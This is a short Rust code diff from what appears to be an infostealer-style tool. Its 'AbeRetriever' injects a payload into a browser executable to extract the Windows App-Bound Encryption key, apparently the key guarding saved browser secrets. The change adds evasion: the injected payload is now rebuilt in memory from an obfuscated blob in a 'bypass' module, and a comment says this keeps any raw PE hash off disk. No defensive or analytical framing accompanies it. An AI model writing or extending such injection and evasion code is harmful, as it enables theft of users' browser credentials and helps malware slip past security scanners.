@@ -70,7 +70,11 @@ impl Retriever for AbeRetriever {
 
         let enc_b64 = STANDARD.encode(&blob);
         let env: &[(&str, &[u8])] = &[(ABE_ENC_ENV, enc_b64.as_bytes())];
-        let key = abi::inject(&exe_path, abi::PAYLOAD_AMD64, env).map_err(|e| {
+        // Materialized from the const-mangled blob (`bypass::entropy`) so the
+        // on-disk image carries no raw PE hash; the real payload exists only
+        // in memory here, just before injection.
+        let payload = bypass::entropy::materialize();
+        let key = abi::inject(&exe_path, &payload, env).map_err(|e| {
             RetrieverError::Retriever(format!("inject {}: {e}", hints.windows_abe_key))
         })?;
         Ok(Some(key.to_vec()))
